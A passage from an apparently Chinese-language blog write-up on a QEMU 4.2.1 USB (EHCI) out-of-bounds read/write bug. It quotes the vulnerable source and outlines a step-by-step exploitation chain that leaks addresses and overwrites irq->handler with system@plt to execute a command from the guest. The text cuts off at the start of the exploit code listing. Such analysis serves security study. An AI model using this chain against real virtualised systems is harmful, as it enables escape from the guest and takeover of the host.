&#125;<br>            qemu_iovec_add(&amp;p-&gt;iov, mem, xlen);	<span class="hljs-comment">// mem与xlen来自sgl-&gt;sg[i].base与sgl-&gt;sg[i].len</span><br>            len -= xlen;<br>            base += xlen;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err:<br>    usb_packet_unmap(p, sgl);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_iovec_add</span><span class="hljs-params">(QEMUIOVector *qiov, <span class="hljs-type">void</span> *base, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    assert(qiov-&gt;nalloc != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">if</span> (qiov-&gt;niov == qiov-&gt;nalloc) &#123;<br>        qiov-&gt;nalloc = <span class="hljs-number">2</span> * qiov-&gt;nalloc + <span class="hljs-number">1</span>;<br>        qiov-&gt;iov = g_renew(<span class="hljs-keyword">struct</span> iovec, qiov-&gt;iov, qiov-&gt;nalloc);<br>    &#125;<br>    qiov-&gt;iov[qiov-&gt;niov].iov_base = base;<br>    qiov-&gt;iov[qiov-&gt;niov].iov_len = len;<br>    qiov-&gt;size += len;<br>    ++qiov-&gt;niov;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>接下来就看<code>sgl-&gt;sg[i].base</code> 与<code>sgl-&gt;sg[i].len</code> 从何处而来即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ehci_execute</span><br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">if</span> (p-&gt;async == EHCI_ASYNC_NONE)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ehci_init_transfer(p) != <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        spd = (p-&gt;pid == USB_TOKEN_IN &amp;&amp; NLPTR_TBIT(p-&gt;qtd.altnext) == <span class="hljs-number">0</span>);<br>        usb_packet_setup(&amp;p-&gt;packet, p-&gt;pid, ep, <span class="hljs-number">0</span>, p-&gt;qtdaddr, spd,<br>                         (p-&gt;qtd.token &amp; QTD_TOKEN_IOC) != <span class="hljs-number">0</span>);<br>        usb_packet_map(&amp;p-&gt;packet, &amp;p-&gt;sgl);<br>        p-&gt;async = EHCI_ASYNC_INITIALIZED;<br>    &#125;<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_init_transfer</span><span class="hljs-params">(EHCIPacket *p)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> cpage, offset, bytes, plen;<br>    <span class="hljs-type">dma_addr_t</span> page;<br><br>    cpage = get_field(p-&gt;qtd.token, QTD_TOKEN_CPAGE);<br>    bytes = get_field(p-&gt;qtd.token, QTD_TOKEN_TBYTES);<br>    offset = p-&gt;qtd.bufptr[<span class="hljs-number">0</span>] &amp; ~QTD_BUFPTR_MASK;<br>    qemu_sglist_init(&amp;p-&gt;sgl, p-&gt;<span class="hljs-built_in">queue</span>-&gt;ehci-&gt;device, <span class="hljs-number">5</span>, p-&gt;<span class="hljs-built_in">queue</span>-&gt;ehci-&gt;as);<br><br>    <span class="hljs-keyword">while</span> (bytes &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cpage &gt; <span class="hljs-number">4</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;cpage out of range (%d)\n&quot;</span>, cpage);<br>            qemu_sglist_destroy(&amp;p-&gt;sgl);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        page = p-&gt;qtd.bufptr[cpage] &amp; QTD_BUFPTR_MASK;<br>        page += offset;<br>        plen = bytes;<br>        <span class="hljs-keyword">if</span> (plen &gt; <span class="hljs-number">4096</span> - offset)<br>        &#123;<br>            plen = <span class="hljs-number">4096</span> - offset;<br>            offset = <span class="hljs-number">0</span>;<br>            cpage++;<br>        &#125;<br><br>        qemu_sglist_add(&amp;p-&gt;sgl, page, plen);	<span class="hljs-comment">// page与len来自p-&gt;qtd.token字段</span><br>        bytes -= plen;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_sglist_add</span><span class="hljs-params">(QEMUSGList *qsg, <span class="hljs-type">dma_addr_t</span> base, <span class="hljs-type">dma_addr_t</span> len)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (qsg-&gt;nsg == qsg-&gt;nalloc) &#123;<br>        qsg-&gt;nalloc = <span class="hljs-number">2</span> * qsg-&gt;nalloc + <span class="hljs-number">1</span>;<br>        qsg-&gt;sg = g_realloc(qsg-&gt;sg, qsg-&gt;nalloc * <span class="hljs-keyword">sizeof</span>(ScatterGatherEntry));<br>    &#125;<br>    qsg-&gt;sg[qsg-&gt;nsg].base = base;<br>    qsg-&gt;sg[qsg-&gt;nsg].len = len;<br>    qsg-&gt;size += len;<br>    ++qsg-&gt;nsg;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><code>p-&gt;qtd.token</code> 字段是我们可以控制的，总的来说，调用<code>usb_packet_map</code> 函数可以实现用户可控内容读写。</p>
<h2 id="漏洞定位">漏洞定位</h2>
<p><code>qemu-4.2.1\hw\usb\core.c: do_token_setup</code></p>
<p>[1]处调用<code>usb_packet_copy</code> 函数控制变量<code>s-&gt;setup_buf</code>，[2]处根据<code>s-&gt;setup_buf</code> 为变量<code>s-&gt;setup_len</code>赋值，其最大为0xffff，但是[3]处判断逻辑出现问题，使得<code>s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)</code> 条件成立的情况下，依然为变量<code>s-&gt;setup_len</code> 赋值，没有起到检查的效果。</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs xl">static void do_token_setup(USBDevice *s, USBPacket *p)<br>&#123;<br>    int request, value, index;<br><br>    <span class="hljs-function"><span class="hljs-title">if</span> (p-&gt;</span>iov.size != <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>status = USB_RET_STALL;<br>        return;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-title">usb_packet_copy</span>(p, s-&gt;</span><span class="hljs-function"><span class="hljs-title">setup_buf</span>, p-&gt;</span>iov.size);	<span class="hljs-comment">//&lt;----------------- [1]</span><br>    <span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span>setup_index = <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>actual_length = <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">setup_len</span>   = (s-&gt;</span><span class="hljs-function"><span class="hljs-title">setup_buf</span>[7] &lt;&lt; 8) | s-&gt;</span>setup_buf[<span class="hljs-number">6</span>];	<span class="hljs-comment">//&lt;---------------- [2]</span><br>    <span class="hljs-function"><span class="hljs-title">if</span> (s-&gt;</span><span class="hljs-function"><span class="hljs-title">setup_len</span> &gt; sizeof(s-&gt;</span>data_buf)) &#123;	<span class="hljs-comment">//&lt;------------------ [3]</span><br>        fprintf(stderr,<br>                <span class="hljs-string">&quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n&quot;</span>,<br>                <span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">setup_len</span>, sizeof(s-&gt;</span>data_buf));<br>        <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>status = USB_RET_STALL;<br>        return;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-title">request</span> = (s-&gt;</span><span class="hljs-function"><span class="hljs-title">setup_buf</span>[0] &lt;&lt; 8) | s-&gt;</span>setup_buf[<span class="hljs-number">1</span>];<br>    <span class="hljs-function"><span class="hljs-title">value</span>   = (s-&gt;</span><span class="hljs-function"><span class="hljs-title">setup_buf</span>[3] &lt;&lt; 8) | s-&gt;</span>setup_buf[<span class="hljs-number">2</span>];<br>    <span class="hljs-function"><span class="hljs-title">index</span>   = (s-&gt;</span><span class="hljs-function"><span class="hljs-title">setup_buf</span>[5] &lt;&lt; 8) | s-&gt;</span>setup_buf[<span class="hljs-number">4</span>];<br><br>    <span class="hljs-function"><span class="hljs-title">if</span> (s-&gt;</span>setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN) &#123;<br>        usb_device_handle_control(s, p, request, value, index,<br>                                  <span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">setup_len</span>, s-&gt;</span>data_buf);<br>        <span class="hljs-function"><span class="hljs-title">if</span> (p-&gt;</span>status == USB_RET_ASYNC) &#123;<br>            <span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span>setup_state = SETUP_STATE_SETUP;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-title">if</span> (p-&gt;</span>status != USB_RET_SUCCESS) &#123;<br>            return;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-title">if</span> (p-&gt;</span><span class="hljs-function"><span class="hljs-title">actual_length</span> &lt; s-&gt;</span>setup_len) &#123;<br>            <span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">setup_len</span> = p-&gt;</span>actual_length;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span>setup_state = SETUP_STATE_DATA;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-function"><span class="hljs-title">if</span> (s-&gt;</span>setup_len == <span class="hljs-number">0</span>)<br>            <span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span>setup_state = SETUP_STATE_ACK;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span>setup_state = SETUP_STATE_DATA;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>actual_length = <span class="hljs-number">8</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qemu</span>-<span class="hljs-number">4</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>\hw\usb\core.c：do_token_in<br></code></pre></td></tr></table></figure>
<p>[1]处通过<code>s-&gt;setup_len</code>获取<code>len</code>字段，而<code>p-&gt;iov.size</code> 根据上述分析用户可控，然后在[2]处调用<code>usb_packet_copy</code> 函数造成越界访问，从而获取越界读。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_in</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    <span class="hljs-type">int</span> request, value, index;<br><br>    assert(p-&gt;ep-&gt;nr == <span class="hljs-number">0</span>);<br><br>    request = (s-&gt;setup_buf[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">8</span>) | s-&gt;setup_buf[<span class="hljs-number">1</span>];<br>    value   = (s-&gt;setup_buf[<span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">8</span>) | s-&gt;setup_buf[<span class="hljs-number">2</span>];<br>    index   = (s-&gt;setup_buf[<span class="hljs-number">5</span>] &lt;&lt; <span class="hljs-number">8</span>) | s-&gt;setup_buf[<span class="hljs-number">4</span>];<br><br>    <span class="hljs-keyword">switch</span>(s-&gt;setup_state) &#123;<br>    <span class="hljs-keyword">case</span> SETUP_STATE_ACK:<br>        <span class="hljs-keyword">if</span> (!(s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN)) &#123;<br>            usb_device_handle_control(s, p, request, value, index,<br>                                      s-&gt;setup_len, s-&gt;data_buf);<br>            <span class="hljs-keyword">if</span> (p-&gt;status == USB_RET_ASYNC) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            s-&gt;setup_state = SETUP_STATE_IDLE;<br>            p-&gt;actual_length = <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> SETUP_STATE_DATA:	<br>        <span class="hljs-keyword">if</span> (s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN) &#123;	<br>            <span class="hljs-type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;	<span class="hljs-comment">// [1]</span><br>            <span class="hljs-keyword">if</span> (len &gt; p-&gt;iov.size) &#123;<br>                len = p-&gt;iov.size;<br>            &#125;<br>            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);	<span class="hljs-comment">// [2]</span><br>            s-&gt;setup_index += len;<br>            <span class="hljs-keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;<br>                s-&gt;setup_state = SETUP_STATE_ACK;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        s-&gt;setup_state = SETUP_STATE_IDLE;<br>        p-&gt;status = USB_RET_STALL;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">default</span>:<br>        p-&gt;status = USB_RET_STALL;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qemu</span>-<span class="hljs-number">4</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>\hw\usb\core.c：do_token_out<br></code></pre></td></tr></table></figure>
<p>同理，[1]处通过<code>s-&gt;setup_len</code>获取<code>len</code>字段，而<code>p-&gt;iov.size</code> 根据上述分析用户可控，然后在[2]处调用<code>usb_packet_copy</code> 函数造成越界写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_out</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    assert(p-&gt;ep-&gt;nr == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">switch</span>(s-&gt;setup_state) &#123;<br>    <span class="hljs-keyword">case</span> SETUP_STATE_ACK:<br>        <span class="hljs-keyword">if</span> (s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN) &#123;<br>            s-&gt;setup_state = SETUP_STATE_IDLE;<br>            <span class="hljs-comment">/* transfer OK */</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* ignore additional output */</span><br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> SETUP_STATE_DATA:<br>        <span class="hljs-keyword">if</span> (!(s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN)) &#123;<br>            <span class="hljs-type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;	<span class="hljs-comment">// [1]</span><br>            <span class="hljs-keyword">if</span> (len &gt; p-&gt;iov.size) &#123;<br>                len = p-&gt;iov.size;<br>            &#125;<br>            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);	<span class="hljs-comment">// [2]</span><br>            s-&gt;setup_index += len;<br>            <span class="hljs-keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;<br>                s-&gt;setup_state = SETUP_STATE_ACK;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        s-&gt;setup_state = SETUP_STATE_IDLE;<br>        p-&gt;status = USB_RET_STALL;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">default</span>:<br>        p-&gt;status = USB_RET_STALL;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<h1 id="03-使用pwngdb调试">03 使用pwngdb调试</h1>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb /opt/qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64<br></code></pre></td></tr></table></figure>
<p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251215105548295.png" srcset="/img/loading.gif" lazyload alt="image-20251215105548295"></p>
<h1 id="04-漏洞利用">04 漏洞利用</h1>
<p>整体利用思路</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">do_token_setup</span> -&gt;</span> 先发一个正常包设置 <span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span>setup_state <br><span class="hljs-function"><span class="hljs-title">do_token_setup</span> -&gt;</span> 发一个<span class="hljs-function"><span class="hljs-title">size</span>为0x5000的包设置 s-&gt;</span>setup_len<br><span class="hljs-function"><span class="hljs-title">do_token_out</span> -&gt;</span> 越界写，控制 <span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span>setup_index<br><span class="hljs-function"><span class="hljs-title">do_token_out</span> -&gt;</span> 控制 <span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">setup_buf</span> 使其能进入do_token_in进行读操作,同时设置 s-&gt;</span>setup_index控制读的位置<br><span class="hljs-function"><span class="hljs-title">do_token_in</span> -&gt;</span> 读操作，泄漏<span class="hljs-keyword">text</span>(<span class="hljs-keyword">text</span>段)、irq(heap段)地址<br><span class="hljs-function"><span class="hljs-title">do_token_setup</span> -&gt;</span> 重新发送一个正常包恢复状态<br><span class="hljs-function"><span class="hljs-title">do_token_setup</span> -&gt;</span> 发一个<span class="hljs-function"><span class="hljs-title">size</span>为0x5000的包设置 s-&gt;</span>setup_len<br><span class="hljs-function"><span class="hljs-title">do_token_out</span> -&gt;</span> 越界写，控制 <span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">setup_index</span>,指向irq-&gt;</span>handler<br><span class="hljs-function"><span class="hljs-title">do_token_out</span> -&gt;</span> 覆盖<span class="hljs-function"><span class="hljs-title">irq</span>-&gt;</span>handler为system@plt<br>最后通过<span class="hljs-function"><span class="hljs-title">mmio</span>读写触发ehci_update_irq-&gt;</span>qemu_set_irq，最终执行system(<span class="hljs-string">&#x27;xcalc&#x27;</span>)，完成利用<br></code></pre></td></tr></table></figure>
<p>下断点在<code>do_token_in</code></p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">b</span> do_token_in<br></code></pre></td></tr></table></figure>
<p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251215105636485.png" srcset="/img/loading.gif" lazyload alt="image-20251215105636485"></p>
<p>越界读</p>
<ol>
<li>调用<code>do_token_setup</code> 设置越界长度</li>
<li>调用<code>do_token_in</code> 将<code>s-&gt;data_buf</code> 数据复制到用户空间，实现越界读</li>
</ol>
<p>越界写</p>
<ol>
<li>调用<code>do_token_setup</code> 设置越界长度</li>
<li>调用<code>do_token_out</code> 将用户空间数据写入<code>s-&gt;data_buf</code> 中，实现越界写</li>
</ol>
<p>获取基地址：通过越界读，获取<code>USBDevice</code> 对象的地址，通过计算偏移，可以得到<code>data_buf</code> 与 <code>USBPort</code> 字段的地址。搜索越界读的内容，可以泄露代码段地址，可以得到程序基地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span 